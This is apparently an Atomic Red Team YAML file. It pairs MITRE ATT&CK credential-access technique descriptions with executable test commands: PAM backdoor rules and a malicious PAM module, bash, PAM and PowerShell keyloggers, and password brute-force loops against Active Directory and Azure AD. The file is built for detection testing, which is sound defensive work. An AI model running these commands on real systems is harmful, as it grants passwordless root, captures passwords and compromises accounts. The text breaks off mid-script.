credential-access:
  T1557:
    technique:
      modified: '2023-03-30T21:01:37.568Z'
      name: Adversary-in-the-Middle
      description: |-
        Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)

        For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials and session cookies.(Citation: volexity_0day_sophos_FW) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)

        Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - Mayuresh Dani, Qualys
      - Daniil Yugoslavskiy, @yugoslavskiy, Atomic Threat Coverage project
      - NEC
      x_mitre_deprecated: false
      x_mitre_detection: Monitor network traffic for anomalies associated with known
        AiTM behavior. Consider monitoring for modifications to system configuration
        files involved in shaping network traffic flow.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      - Network
      x_mitre_version: '2.2'
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Network Traffic: Network Traffic Content'
      - 'Service: Service Creation'
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Network Traffic: Network Traffic Flow'
      type: attack-pattern
      id: attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d
      created: '2020-02-11T19:07:12.114Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1557
        external_id: T1557
      - source_name: dns_changer_trojans
        description: Abendan, O. (2012, June 14). How DNS Changer Trojans Direct Users
          to Threats. Retrieved October 28, 2021.
        url: https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/125/how-dns-changer-trojans-direct-users-to-threats
      - source_name: volexity_0day_sophos_FW
        description: 'Adair, S., Lancaster, T., Volexity Threat Research. (2022, June
          15). DriftingCloud: Zero-Day Sophos Firewall Exploitation and an Insidious
          Breach. Retrieved July 1, 2022.'
        url: https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/
      - source_name: taxonomy_downgrade_att_tls
        description: Alashwali, E. S., Rasmussen, K. (2019, January 26). What's in
          a Downgrade? A Taxonomy of Downgrade Attacks in the TLS Protocol and Application
          Protocols Using TLS. Retrieved December 7, 2021.
        url: https://arxiv.org/abs/1809.05681
      - source_name: ad_blocker_with_miner
        description: Kuzmenko, A.. (2021, March 10). Ad blocker with miner included.
          Retrieved October 28, 2021.
        url: https://securelist.com/ad-blocker-with-miner-included/101105/
      - source_name: mitm_tls_downgrade_att
        description: praetorian Editorial Team. (2014, August 19). Man-in-the-Middle
          TLS Protocol Downgrade Attack. Retrieved December 8, 2021.
        url: https://www.praetorian.com/blog/man-in-the-middle-tls-ssl-protocol-downgrade-attack/
      - source_name: Rapid7 MiTM Basics
        description: Rapid7. (n.d.). Man-in-the-Middle (MITM) Attacks. Retrieved March
          2, 2020.
        url: https://www.rapid7.com/fundamentals/man-in-the-middle-attacks/
      - source_name: tlseminar_downgrade_att
        description: Team Cinnamon. (2017, February 3). Downgrade Attacks. Retrieved
          December 9, 2021.
        url: https://tlseminar.github.io/downgrade-attacks/
      - source_name: ttint_rat
        description: 'Tu, L. Ma, Y. Ye, G. (2020, October 1). Ttint: An IoT Remote
          Access Trojan spread through 2 0-day vulnerabilities. Retrieved October
          28, 2021.'
        url: https://blog.netlab.360.com/ttint-an-iot-remote-control-trojan-spread-through-2-0-day-vulnerabilities/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
    atomic_tests: []
  T1556.003:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Scott Knight, @sdotknight, VMware Carbon Black
      - George Allen, VMware Carbon Black
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771
      type: attack-pattern
      created: '2020-06-26T04:01:09.648Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1556.003
        url: https://attack.mitre.org/techniques/T1556/003
      - source_name: Apple PAM
        url: https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt
        description: Apple. (2011, May 11). PAM - Pluggable Authentication Modules.
          Retrieved June 25, 2020.
      - source_name: Man Pam_Unix
        url: https://linux.die.net/man/8/pam_unix
        description: die.net. (n.d.). pam_unix(8) - Linux man page. Retrieved June
          25, 2020.
      - source_name: Red Hat PAM
        url: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/managing_smart_cards/pluggable_authentication_modules
        description: Red Hat. (n.d.). CHAPTER 2. USING PLUGGABLE AUTHENTICATION MODULES
          (PAM). Retrieved June 25, 2020.
      - source_name: PAM Backdoor
        url: https://github.com/zephrax/linux-pam-backdoor
        description: zephrax. (2018, August 3). linux-pam-backdoor. Retrieved June
          25, 2020.
      - source_name: PAM Creds
        url: https://x-c3ll.github.io/posts/PAM-backdoor-DNS/
        description: Fern√°ndez, J. M. (2018, June 27). Exfiltrating credentials via
          PAM backdoors & DNS requests. Retrieved June 26, 2020.
      modified: '2021-10-17T14:48:33.580Z'
      name: 'Modify Authentication Process: Pluggable Authentication Modules'
      description: |-
        Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)

        Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)

        Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      x_mitre_detection: |-
        Monitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.

        Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).
      x_mitre_is_subtechnique: true
      x_mitre_version: '2.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Creation'
      - 'File: File Modification'
      x_mitre_permissions_required:
      - root
      identifier: T1556.003
    atomic_tests:
    - name: Malicious PAM rule
      auto_generated_guid: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
      description: |
        Inserts a rule into a PAM config and then tests it.

        Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
      supported_platforms:
      - linux
      input_arguments:
        path_to_pam_conf:
          description: PAM config file to modify.
          type: string
          default: "/etc/pam.d/su-l"
        pam_rule:
          description: Rule to add to the PAM config.
          type: string
          default: auth sufficient pam_succeed_if.so uid >= 0
        index:
          description: Index where the rule is inserted.
          type: integer
          default: 1
      executor:
        name: sh
        elevation_required: true
        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}

          '
        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}

          '
    - name: Malicious PAM module
      auto_generated_guid: 65208808-3125-4a2e-8389-a0a00e9ab326
      description: |
        Creates a PAM module, inserts a rule to use it, and then tests it.

        Upon successful execution, this test will create a PAM module that allows every user to su to root without a password.
      supported_platforms:
      - linux
      input_arguments:
        path_to_pam_conf:
          description: PAM config file to modify.
          type: string
          default: "/etc/pam.d/su-l"
        pam_rule:
          description: Rule to add to the PAM config.
          type: string
          default: auth sufficient /tmp/pam_evil.so
        index:
          description: Index where the rule is inserted.
          type: integer
          default: 1
        path_to_pam_module_source:
          description: Path to PAM module source code.
          type: path
          default: PathToAtomicsFolder/T1556.003/src/pam_evil.c
        path_to_pam_module:
          description: Path to PAM module object
          type: path
          default: "/tmp/pam_evil.so"
      dependencies:
      - description: 'The PAM development library must be installed to build the PAM
          module

          '
        prereq_command: 'if [ -f /usr/include/security/pam_modules.h ]; then exit
          0; else exit 1; fi;

          '
        get_prereq_command: 'if [ -n "`which apt-get`" ]; then sudo apt-get -y install
          libpam0g-dev; elif [ -n "`which yum`" ]; then sudo yum -y install pam-devel;
          fi

          '
      - description: 'The PAM module must exist on disk at specified location (#{path_to_pam_module})

          '
        prereq_command: 'if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1;
          fi;

          '
        get_prereq_command: 'sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}

          '
      executor:
        name: sh
        elevation_required: true
        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}

          '
        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}

          '
  T1056.001:
    technique:
      modified: '2023-03-30T21:01:37.930Z'
      name: 'Input Capture: Keylogging'
      description: "Adversaries may log user keystrokes to intercept credentials as
        the user types them. Keylogging is likely to be used to acquire credentials
        for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
        efforts are not effective, and may require an adversary to intercept keystrokes
        on a system for a substantial period of time before credentials can be successfully
        captured.\n\nKeylogging is the most prevalent type of input capture, with
        many different ways of intercepting keystrokes.(Citation: Adventures of a
        Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing
        keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004),
        this focuses solely on API functions intended for processing keystroke data.\n*
        Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n*
        Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601)
        may provide adversaries with hooks into the operating system of network devices
        to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device
        Attacks) "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: 'Keyloggers may take many forms, possibly involving modification
        to the Registry and installation of a driver, setting a hook, or polling to
        intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`,
        and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry
        and file system for such changes, monitor driver installs, and look for common
        keylogging API calls. API calls alone are not an indicator of keylogging,
        but may provide behavioral data that is useful when combined with other information
        such as new files written to disk and unusual processes.'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      - Network
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Driver: Driver Load'
      x_mitre_permissions_required:
      - Administrator
      - root
      - SYSTEM
      - User
      type: attack-pattern
      id: attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4
      created: '2020-02-11T18:58:11.791Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1056/001
        external_id: T1056.001
      - source_name: Adventures of a Keystroke
        description: 'Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth
          look into keyloggers on Windows. Retrieved April 27, 2016.'
        url: http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf
      - source_name: Cisco Blog Legacy Device Attacks
        description: Omar Santos. (2020, October 19). Attackers Continue to Target
          Legacy Devices. Retrieved October 20, 2020.
        url: https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      identifier: T1056.001
    atomic_tests:
    - name: Input Capture
      auto_generated_guid: d9b633ca-8efb-45e6-b838-70f595c6ae26
      description: |
        Utilize PowerShell and external resource to capture keystrokes
        [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)
        Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)

        Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.
      supported_platforms:
      - windows
      input_arguments:
        filepath:
          description: Name of the local file, include path.
          type: path
          default: "$env:TEMP\\key.log"
      dependencies:
      - description: 'Get-Keystrokes PowerShell script must exist on disk at PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1

          '
        prereq_command: 'if (Test-Path PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1)
          {exit 0} else {exit 1}

          '
        get_prereq_command: "Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1
          -OutFile PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1     \n"
      executor:
        command: "$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1 -LogPath
          #{filepath}\n"
        cleanup_command: 'Remove-Item $env:TEMP\key.log -ErrorAction Ignore

          '
        name: powershell
        elevation_required: true
    - name: Living off the land Terminal Input Capture on Linux with pam.d
      auto_generated_guid: 9c6bdb34-a89f-4b90-acb1-5970614c711b
      description: "Pluggable Access Module, which is present on all modern Linux
        systems, generally contains a library called pam_tty_audit.so which logs all
        keystrokes for the selected users and sends it to audit.log.  All terminal
        activity on any new logins would then be archived and readable by an adversary
        with elevated privledges.\n\nPasswords hidden by the console can also be logged,
        with 'log_passwd' as in this example.  If root logging is enabled, then output
        from any process which is later started by root is also logged, even if this
        policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse
        'aureport --tty' or other audit.d reading tools to read the log output, which
        is binary.  Mac OS does not currently contain the pam_tty_audit.so library.
        \n"
      dependencies:
      - description: 'Checking if pam_tty_audit.so is installed

          '
        prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''

          '
        get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so
          and recompile, for this test to work"

          '
      supported_platforms:
      - linux
      executor:
        command: |
          if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;
          if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;
          sudo touch /tmp/password-auth.bk
          sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so
          enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so
          enable=* log_password" >> /etc/pam.d/system-auth
        cleanup_command: |
          sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth
          sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
        name: sh
        elevation_required: true
    - name: Logging bash history to syslog
      auto_generated_guid: 0e59d59d-3265-4d35-bebd-bf5c1ec40db5
      description: "There are several variables that can be set to control the appearance
        of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents
        of these variables are executed as if they had been typed on the command line.
        The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable
        and can be configured to write the latest \"bash history\" entries to the
        syslog.\n\nTo gain persistence the command could be added to the users .bashrc
        or .bash_aliases or the systems default .bashrc in /etc/skel/ \n"
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'This test requires to be run in a bash shell and that logger
          and tee are installed.

          '
        prereq_command: |
          if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
          if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed *****\n"; exit 1; fi
          if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n"; exit 1; fi
        get_prereq_command: 'echo ""

          '
      executor:
        name: sh
        elevation_required: true
        command: |
          PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
          echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
          tail /var/log/syslog
        cleanup_command: 'unset PROMPT_COMMAND

          '
    - name: Bash session based keylogger
      auto_generated_guid: 7f85a946-a0ea-48aa-b6ac-8ff539278258
      description: "When a command is executed in bash, the BASH_COMMAND variable
        contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\".
        The trap command is not a external command, but a built-in function of bash
        and can be used in a script to run a bash function when some event occurs.
        trap will detect when the BASH_COMMAND variable value changes and then pipe
        that value into a file, creating a bash session based keylogger. \n\nTo gain
        persistence the command could be added to the users .bashrc or .bash_aliases
        or the systems default .bashrc in /etc/skel/ \n"
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'This test requires to be run in a bash shell

          '
        prereq_command: 'if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n*****
          Bash not running! *****\n"; exit 1; fi

          '
        get_prereq_command: 'echo ""

          '
      input_arguments:
        output_file:
          name: output_file
          description: File to store captured commands
          type: string
          default: "/tmp/.keyboard.log"
      executor:
        name: sh
        elevation_required: false
        command: |
          trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
          echo "Hello World!"
          cat #{output_file}
        cleanup_command: 'rm #{output_file}

          '
    - name: SSHD PAM keylogger
      auto_generated_guid: 81d7d2ad-d644-4b6a-bea7-28ffe43becca
      description: 'Linux PAM (Pluggable Authentication Modules) is used in sshd authentication.
        The Linux audit tool auditd can use the pam_tty_audit module to enable auditing
        of TTY input and capture all keystrokes in a ssh session and place them in
        the /var/log/audit/audit.log file after the session closes.

        '
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'This test requires sshd and auditd

          '
        prereq_command: |
          if [ ! -x "$(command -v sshd)" ]; then echo -e "\n***** sshd NOT installed *****\n"; exit 1; fi
          if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
        get_prereq_command: 'echo ""

          '
      input_arguments:
        user_account:
          description: Basic ssh user account for testing.
          type: string
          default: ubuntu
      executor:
        name: sh
        elevation_required: true
        command: "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so
          disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl
          restart sshd\nsystemctl restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo
          su\nwhoami\nexit\nexit\n"
        cleanup_command: 'cp -fv /tmp/sshd /etc/pam.d/

          '
    - name: Auditd keylogger
      auto_generated_guid: a668edb9-334e-48eb-8c2e-5413a40867af
      description: "The linux audit tool auditd can be used to capture 32 and 64 bit
        command execution and place the command in the /var/log/audit/audit.log audit
        log. \n"
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'This test requires sshd and auditd

          '
        prereq_command: 'if [ ! -x "$(command -v auditd)" ]; then echo -e "\n*****
          auditd NOT installed *****\n"; exit 1; fi

          '
        get_prereq_command: 'echo ""

          '
      executor:
        name: sh
        elevation_required: true
        command: "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl
          -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start
          $(date +\"%d/%m/%y %H:%M:%S\") \n"
        cleanup_command: 'systemctl restart auditd

          '
    - name: MacOS Swift Keylogger
      auto_generated_guid: aee3a097-4c5c-4fff-bbd3-0a705867ae29
      description: |
        Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.
        Input Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.
        Referece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74
      supported_platforms:
      - macos
      input_arguments:
        swift_src:
          description: Location of swift script
          type: path
          default: PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift
      dependency_executor_name: bash
      dependencies:
      - description: 'swift script must exist at #{swift_src}, and the terminal must
          have input monitoring permissions.

          '
        prereq_command: 'if [ -f #{swift_src} ]; then chmod +x #{swift_src}; else
          exit 1; fi

          '
        get_prereq_command: 'echo ""

          '
      executor:
        command: 'swift #{swift_src} -keylog

          '
        cleanup_command: 'kill `pgrep swift-frontend`

          '
        name: bash
        elevation_required: false
  T1110.001:
    technique:
      modified: '2023-04-14T23:04:08.394Z'
      name: 'Brute Force: Password Guessing'
      description: |-
        Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.

        Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

        Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:

        * SSH (22/TCP)
        * Telnet (23/TCP)
        * FTP (21/TCP)
        * NetBIOS / SMB / Samba (139/TCP & 445/TCP)
        * LDAP (389/TCP)
        * Kerberos (88/TCP)
        * RDP / Terminal Services (3389/TCP)
        * HTTP/HTTP Management Services (80/TCP & 443/TCP)
        * MSSQL (1433/TCP)
        * Oracle (1521/TCP)
        * MySQL (3306/TCP)
        * VNC (5900/TCP)
        * SNMP (161/UDP and 162/TCP/UDP)

        In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)

        In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Microsoft Threat Intelligence Center (MSTIC)
      - Mohamed Kmal
      x_mitre_deprecated: false
      x_mitre_detection: Monitor authentication logs for system and application login
        failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If
        authentication failures are high, then there may be a brute force attempt
        to gain access to a system using legitimate credentials.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      - Containers
      - Network
      x_mitre_version: '1.4'
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'User Account: User Account Authentication'
      type: attack-pattern
      id: attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119
      created: '2020-02-11T18:38:22.617Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1110/001
        external_id: T1110.001
      - source_name: Trend Micro Emotet 2020
        description: Cybercrime & Digital Threat Team. (2020, February 13). Emotet
          Now Spreads via Wi-Fi. Retrieved February 16, 2022.
        url: https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/emotet-now-spreads-via-wi-fi
      - source_name: Cylance Cleaver
        description: Cylance. (2014, December). Operation Cleaver. Retrieved September
          14, 2017.
        url: https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf
      - source_name: US-CERT TA18-068A 2018
        description: US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted
          by Cyber Actors. Retrieved October 2, 2019.
        url: https://www.us-cert.gov/ncas/alerts/TA18-086A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1110.001
    atomic_tests:
    - name: Brute Force Credentials of single Active Directory domain users via SMB
      auto_generated_guid: '09480053-2f98-4854-be6e-71ae5f672224'
      description: 'Attempts to brute force a single Active Directory account by testing
        connectivity to the IPC$ share on a domain controller

        '
      supported_platforms:
      - windows
      input_arguments:
        user:
          description: Account to bruteforce
          type: string
          default: "%username%"
      executor:
        name: command_prompt
        command: |
          echo Password1> passwords.txt
          echo 1q2w3e4r>> passwords.txt
          echo Password!>> passwords.txt
          echo Spring2022>> passwords.txt
          echo ChangeMe!>> passwords.txt
          @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\#{user}" "%p" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL
    - name: Brute Force Credentials of single Active Directory domain user via LDAP
        against domain controller (NTLM or Kerberos)
      auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250
      description: 'Attempt to brute force Active Directory domain user on a domain
        controller, via LDAP, with NTLM or Kerberos

        '
      supported_platforms:
      - windows
      input_arguments:
        user:
          description: Account to bruteforce
          type: string
          default: "$ENV:USERNAME"
        passwords_path:
          description: List of passwords we will attempt to brute force with
          type: path
          default: PathToAtomicsFolder\T1110.001\src\passwords.txt
        domain:
          description: Active Directory domain FQDN
          type: string
          default: "$env:UserDnsDomain"
        auth:
          description: authentication method to choose between "NTLM" and "Kerberos"
          type: string
          default: NTLM
      executor:
        name: powershell
        elevation_required: false
        command: |
          if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
            Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
            exit 1
          }

          [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
          $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)

          $passwordList = Get-Content -Path #{passwords_path}
          foreach ($password in $passwordList){
            $credz = new-object System.Net.NetworkCredential("#{user}", $password, "#{domain}")
            $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
            try {
              Write-Host " [-] Attempting ${password} on account #{user}."
              $conn.bind()
              # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
              Write-Host " [!] #{user}:${password} are valid credentials!"
            } catch {
              Write-Host $_.Exception.Message
            }
          }
          Write-Host "End of bruteforce"
    - name: Brute Force Credentials of single Azure AD user
      auto_generated_guid: 5a51ef57-299e-4d62-8e11-2d440df55e69
      description: 'Attempt to brute force Azure AD user via AzureAD powershell module.

        '
      supported_platforms:
      - azure-ad
      input_arguments:
        username:
          description: Account to bruteforce. We encourage users running this atomic
            to add a valid microsoft account domain; for eg "bruce.wayne@<valid_ms_account.com>"
          type: string
          default: bruce.wayne@contoso.com
        passwords:
          description: List of passwords we will attempt to brute force with
          type: string
          default: Password1`n1q2w3e4r`nPassword!
      dependency_executor_name: powershell
      dependencies:
      - description: 'AzureAD module must be installed.

          '
        prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
          {exit 0} else {exit 1}} catch {exit 1}

          '
        get_prereq_command: 'Install-Module -Name AzureAD -Force

          '
      executor:
        name: powershell
        elevation_required: false
        command: |
          Import-Module -Name AzureAD

          $passwords = "#{passwords}".split("{`n}")
          foreach($password in $passwords) {
            $PWord = ConvertTo-SecureString -String "$password" -AsPlainText -Force
            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
            try {
              Write-Host " [-] Attempting ${password} on account #{username}."
